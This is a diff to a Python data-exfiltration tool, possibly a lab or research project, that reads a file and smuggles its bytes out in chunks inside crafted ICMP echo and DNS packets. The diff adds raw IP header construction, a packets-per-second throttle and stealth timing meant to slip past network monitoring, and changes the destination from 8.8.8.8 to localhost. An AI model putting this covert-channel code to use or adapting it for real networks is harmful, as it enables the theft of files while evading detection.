@@ -22,7 +22,7 @@ u_short     = c_ushort
 
 chunkLength         = 20
 completedTransfer   = False
-currentFilePath     = "secretdoc1.txt"
+currentFilePath     = "src.exe"
 exfilBytes          = b''
 ICMP_ECHO_REPLY     = 0
 ICMP_ECHO_REQUEST   = 8
@@ -37,12 +37,14 @@ UDP_PROTOCOL    = socket.getprotobyname('udp')
 # Command line flags
 stealthMode = False
 fastMode    = False
+ppsMode     = (False,0)
 icmpOnly    = False
 dnsOnly     = False
 mixedOnly   = False
 
 monitorThread = None
 
+serverAddress = "192.168.2.13"
 
 class ICMPPacket:
     def __init__(self, type, code, data):
@@ -96,6 +98,7 @@ class DNSPacket:
 def main(q):
     global stealthMode
     global fastMode
+    global ppsMode
     global icmpOnly
     global dnsOnly
     global mixedOnly
@@ -106,6 +109,7 @@ def main(q):
     parser.add_argument('-i', dest="icmp", action="store_true", default=False, required=False)
     parser.add_argument('-d', dest="dns", action="store_true", default=False, required=False)
     parser.add_argument('-m', dest="mixed", action="store_true", default=False, required=False)
+    parser.add_argument("-p", dest="pps", type=int, default=0)
 
     args = parser.parse_args()
 
@@ -120,9 +124,14 @@ def main(q):
     if (args.icmp | args.dns) & args.mixed:
         print("Error: Use -m without -i or -d")
         ret = True
+    if args.mixed & (args.pps != 0):
+        print("Error: -m and -p are mutually exclusive")
     if ret:
         # Return after all errors have been printed
         return
+
+    if args.pps != 0:
+        ppsMode = (True, args.pps)
 
     stealthMode = args.stealth
     fastMode    = args.fast
@@ -141,7 +150,8 @@ def init():
     
     startByte = 0
     exfilBytes = readFile(currentFilePath, "rb")
-    sendSocket = socket.socket(socket.AF_INET, socket.SOCK_RAW)
+    sendSocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+    sendSocket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
 
     if stealthMode:     
         monitorThread = threading.Thread(None, monitorNetwork)
@@ -154,6 +164,8 @@ def loop():
         k = 48 # Constant of proportionality between delay and ppi
         localPPI = updatedPPI
         delay = k / localPPI
+    elif ppsMode[0]:
+        delay = 1/ppsMode[1]
 
     # While the whole file hasn't be exfiltrated
     while startByte < (len(exfilBytes) - 1):
@@ -170,13 +182,13 @@ def loop():
         nextPacketType = getNextPacketType()
         if nextPacketType == ICMP_PROTOCOL:
             print("ICMP packet sent")
-            packet = createICMPPacket()
+            packet = createICMPPacket("127.0.0.1", "127.0.0.1")
         elif nextPacketType == UDP_PROTOCOL:
             print("DNS packet sent")
-            packet = createDNSPacket()
-        sendNext("8.8.8.8", nextPacketType, packet)
+            packet = createDNSPacket("127.0.0.1", "127.0.0.1")
+        sendNext("127.0.0.1", nextPacketType, packet)
 
-        if stealthMode:
+        if stealthMode | ppsMode[0]:
             time.sleep(delay)
 
     sendEndOfFile()
@@ -196,13 +208,16 @@ def getNextPacketType():
         protos = [ICMP_PROTOCOL, UDP_PROTOCOL]
         return protos[math.floor(random.random() * len(protos))]
 
-def createICMPPacket():
+def createICMPPacket(src, dst):
+    ipHeader = getIPHeader(src, dst, 1)
     data = getNextChunk(startByte, chunkLength)
     icmpPacket = ICMPPacket(ICMP_ECHO_REQUEST, 0, data).construct()
     
-    return icmpPacket
+    return ipHeader + icmpPacket
 
-def createDNSPacket():
+def createDNSPacket(src, dst):
+    ipHeader = getIPHeader(src, dst, 17)
+
     queryHostname = b''
     #fileData = getNextChunk(startByte, 248)
     #queryHostname = prepareDataForDNS(fileData)
@@ -231,7 +246,31 @@ def createDNSPacket():
 
     dnsPacket = DNSPacket(queryHostname).construct()
 
-    return dnsPacket
+    return ipHeader + dnsPacket
+
+def getIPHeader(src, dst, proto):
+    version = 4
+    IHL = 5
+    DSCP = 0
+    ECN = 0
+    totalLength = 40
+    identification = math.floor(random.random() * 65536)
+    flags = 0
+    fragmentOffset = 0
+    timeToLive = 128
+    protocol = proto
+    headerChecksum = 0
+    sourceIP = socket.inet_aton(src)
+    destIP = socket.inet_aton(dst)
+    options = 0
+
+    version_IHL = (version << 4) | IHL
+    DSCP_ECN = (DSCP << 2) | ECN
+    flags_fragmentOffset = (flags << 13) | fragmentOffset
+
+    # The '!' ensures all arguments are converted to network byte order
+    header = struct.pack("!BBHHHBBH4s4s", version_IHL, DSCP_ECN, totalLength, identification, flags_fragmentOffset, timeToLive, protocol, headerChecksum, sourceIP, destIP)
+    return header
 
 def stringToDNSQuery(s):
     labels = s.split(".")
@@ -259,8 +298,15 @@ def sendStartOfFile():
     return
     
 def sendEndOfFile():
-    content =  DNSPacket((9).to_bytes(1, "little") + "Completed".encode()  + (0).to_bytes(1, "little")).construct()
-    sendNext("8.8.8.8", UDP_PROTOCOL, content)
+    nextType = getNextPacketType()
+    if nextType == ICMP_PROTOCOL:
+        content =  ICMP("Completed".encode())
+        sendNext("127.0.0.1", ICMP_PROTOCOL, content)
+    elif nextType == UDP_PROTOCOL:
+        ipHeader = getIPHeader("127.0.0.1", "127.0.0.1", 17)
+        content =  DNSPacket((9).to_bytes(1, "little") + "Completed".encode()  + (0).to_bytes(1, "little")).construct()
+        sendNext("127.0.0.1", UDP_PROTOCOL, ipHeader + content)
+    print("Sent end of file")
     return
     
 def stringToBin(s):
